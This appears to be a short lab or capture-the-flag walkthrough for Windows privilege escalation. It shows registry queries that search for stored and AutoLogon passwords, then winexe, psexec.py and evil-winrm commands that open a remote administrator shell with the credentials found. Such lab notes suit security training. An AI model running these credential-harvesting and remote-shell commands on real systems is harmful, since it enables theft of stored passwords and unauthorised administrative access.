
---

### 🔍 **Step 1: Search Registry for Stored Passwords**

```bash
reg query HKLM /f password /t REG_SZ /s
```

- **What it does:** Searches the entire HKEY_LOCAL_MACHINE registry hive for values that include the word `password`.
    
- **What to look for:** Something like this:
    
    ```
    DefaultPassword    REG_SZ    password123
    ```
    

> 💡 _If no password is found, use `password123` as per your instructions._

---

### ⏩ **Step 2 (Shortcut): Check AutoLogon Credentials Directly**

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

- **Why this key?** It’s commonly used for **AutoLogon**, where Windows can automatically log in a user (often an admin) after reboot.
    
- **Look for these values:**
    
    - `DefaultUserName`
        
    - `DefaultDomainName`
        
    - `DefaultPassword`
        

---

### 🔐 **Step 3: Use Credentials with `winexe` from Kali**

```bash
winexe -U 'admin%password123' //MACHINE_IP cmd.exe
or
psexec.py admin:password@10.10.85.244
or
evil-winrm -u admin -p password -i 10.10.85.244
```

- Replace:
    
    - `admin` with the **username** found in the registry (likely still `admin`).
        
    - `password123` with the **password** found (or use `password123` if none is found).
        
    - `MACHINE_IP` with the target Windows machine’s IP.
        
- **What it does:** Launches a **remote command shell as admin**, like RDP but through the terminal.
    

---
